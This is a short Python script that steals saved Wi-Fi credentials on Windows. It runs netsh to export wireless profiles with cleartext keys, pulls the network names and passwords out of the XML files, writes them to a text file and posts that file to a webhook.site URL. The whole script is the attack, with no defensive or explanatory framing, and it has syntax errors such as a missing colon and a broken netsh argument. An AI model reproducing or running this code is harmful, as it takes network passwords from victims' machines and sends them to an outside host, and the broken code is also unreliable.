import subprocess
import os
import sys
import requests

url = "https://webhook.site/00f350a0-60c8-4518-92d9-a916601a6032"

password_file = open("passwords.txt", "w")
password_file.write("juicy passwords")
password_file.close()

wifi_files = []
wifi_name = []
wifi_password = []

command = subprocess.run(["netsh", "wlan", "export", "profile" "key=clear"], capture_output = True).stdout.decode()

path = os.getcwd()

for filename in os.listdir(path):
      if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
            wifi_files.append(filename)
            for i in wifi_files:
                  with open(i, "r") as f:
                        for line in f.readlines():
                              if "name" in line:
                                    stripped = line.strip()
                                    front = stripped[6:]
                                    back = front[:-7]
                                    wifi_name.append(back)
                              if "keyMaterial" in line:
                                    stripped = line.strip()
                                    front = stripped[13:]
                                    back = front[:-14]
                                    wifi_password.append(back)
                                    for x, y in zip(wifi_name, wifi_password)
                                          sys.stdout = open("passwords.txt", "a")
                                          print("SSID: "+x, "password: "+y, sep="/n")
                                          sys.stdout.close()

with open("passwords.txt", "rb") as f:
      r = requests.post(url, data=f)
